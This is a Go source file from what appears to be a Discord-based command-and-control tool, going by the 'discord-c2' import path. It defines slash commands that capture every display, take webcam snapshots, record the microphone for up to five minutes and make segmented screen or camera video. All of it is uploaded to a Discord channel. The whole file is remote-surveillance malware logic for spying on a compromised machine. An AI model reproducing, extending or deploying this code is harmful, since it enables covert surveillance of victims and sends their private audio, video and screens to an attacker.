package commands

// This file contains media-related slash commands such as screenshot, camera,
// microphone recording, and segmented video recording.

import (
	"fmt"
	"log"
	"os"
	"strings"

	"discord-c2/internal/media"

	"github.com/bwmarrin/discordgo"
)

// handleSlashScreenshot captures all active displays and uploads the resulting
// images to the current channel.
func handleSlashScreenshot(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "📸 Capturing screenshots...",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	media.Screenshot(s, i.ChannelID, nil)
}

// handleSlashCamera triggers a single still image capture from the configured
// camera device and uploads it to the channel.
func handleSlashCamera(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "📷 Capturing camera snapshot...",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	media.CameraSnapshot(s, i.ChannelID, nil)
}

// handleSlashMic records audio from the microphone for the requested duration
// and uploads the resulting file when small enough to fit in Discord limits.
func handleSlashMic(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var seconds int64 = 10
	var path string
	log.Printf("MIC slash command invoked: channel=%s user=%s", i.ChannelID, i.Member.User.ID)
	for _, opt := range data.Options {
		if opt.Name == "duration" {
			seconds = opt.IntValue()
		}
		if opt.Name == "path" {
			path = opt.StringValue()
		}
	}
	log.Printf("MIC options: seconds=%d path=%s", seconds, path)
	if seconds <= 0 {
		seconds = 10
	}
	if seconds > 300 {
		seconds = 300
	}
	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			path = home + string(os.PathSeparator) + path[2:]
		}
	}
	log.Printf("MIC normalized: seconds=%d resolvedPath=%s", seconds, path)
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("🎙 Recording %d seconds from microphone...", seconds),
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	log.Printf("MIC starting MicRecord: channel=%s", i.ChannelID)
	media.MicRecord(s, i.ChannelID, nil, int(seconds), path)
	log.Printf("MIC MicRecord returned: channel=%s", i.ChannelID)
}

// handleSlashRecord configures and starts segmented video recording, choosing
// reasonable defaults for size, duration, and quality.
func handleSlashRecord(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var source string
	maxSizeMB := int64(2)
	maxParts := int64(0)
	totalMinutes := int64(0)
	quality := "medium"
	for _, opt := range data.Options {
		switch opt.Name {
		case "source":
			source = strings.ToLower(opt.StringValue())
		case "max_size_mb":
			maxSizeMB = opt.IntValue()
		case "duration_minutes":
			totalMinutes = opt.IntValue()
		case "max_parts":
			maxParts = opt.IntValue()
		case "quality":
			quality = strings.ToLower(opt.StringValue())
		}
	}
	if source != "camera" && source != "screen" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Source must be `camera` or `screen`.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	if maxSizeMB <= 0 {
		maxSizeMB = 2
	}
	if maxSizeMB > 8 {
		maxSizeMB = 8
	}
	var totalSeconds int64
	if totalMinutes > 0 {
		totalSeconds = totalMinutes * 60
	}
	if maxParts <= 0 {
		if totalSeconds > 0 {
			var estKbps int64
			switch quality {
			case "low":
				estKbps = 400
			case "high":
				estKbps = 1500
			default:
				estKbps = 800
			}
			totalBytes := totalSeconds * (estKbps * 1000 / 8)
			maxBytes := maxSizeMB * 1024 * 1024
			if maxBytes <= 0 {
				maxBytes = 2 * 1024 * 1024
			}
			parts := totalBytes / maxBytes
			if totalBytes%maxBytes != 0 {
				parts++
			}
			if parts <= 0 {
				parts = 1
			}
			if parts > 30 {
				parts = 30
			}
			maxParts = parts
		} else {
			maxParts = 5
		}
	}
	if maxParts > 30 {
		maxParts = 30
	}
	if quality != "low" && quality != "medium" && quality != "high" {
		quality = "medium"
	}
	if totalSeconds > 0 && maxParts > 0 {
		seg := totalSeconds / maxParts
		if seg < 5 {
			seg = 5
		}
		totalSeconds = seg * maxParts
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("🎥 Starting %s recording with max %d MB per file and up to %d parts (%s quality)%s...", source, maxSizeMB, maxParts, quality, func() string {
				if totalSeconds > 0 {
					return fmt.Sprintf(" for approximately %d seconds", totalSeconds)
				}
				return ""
			}()),
			Flags: discordgo.MessageFlagsEphemeral,
		},
	})
	go media.VideoRecord(s, i.ChannelID, nil, source, int(maxSizeMB), int(maxParts), int(totalSeconds), quality)
}

// handleSlashRecordStop asks the background recording goroutine to stop the
// current video session, if any.
func handleSlashRecordStop(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Stopping active recording (if any)...",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	go media.VideoStop(s, i.ChannelID, nil)
}
